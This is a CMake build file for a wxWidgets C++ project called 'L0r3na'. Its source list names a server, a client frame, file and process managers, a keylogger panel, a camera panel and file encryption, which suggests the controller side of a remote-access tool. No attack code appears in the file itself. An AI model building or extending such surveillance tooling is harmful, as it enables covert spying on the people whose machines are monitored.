cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(L0r3na LANGUAGES CXX C)

include(FetchContent)

set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)


set(wxBUILD_SHARED OFF)

add_subdirectory(cliente)

message(STATUS "Fetching wxWidgets...")

FetchContent_Declare(
   wxWidgets
   #GIT_REPOSITORY https://github.com/wxWidgets/wxWidgets.git
   #GIT_SHALLOW ON
)
FetchContent_MakeAvailable(wxWidgets)

FetchContent_Declare(
    sqlite3
    #GIT_REPOSITORY https://github.com/sqlite/sqlite.git
)
FetchContent_MakeAvailable(sqlite3)


set(SRCS main.cpp
         misc.cpp
         server.cpp
         frame_cliente.cpp
         panel_file_manager.cpp
         file_editor.cpp
         file_encryption.cpp
         panel_process_manager.cpp
         panel_keylogger.cpp
         panel_camara.cpp
         frame_crypt_db.cpp
         aes256/aes256.cpp
         lzo/minilzo.c)

add_executable(main WIN32 ${SRCS})
target_link_libraries(main PRIVATE wxcore wxpng wxnet wxaui wxhtml winmm winsqlite3)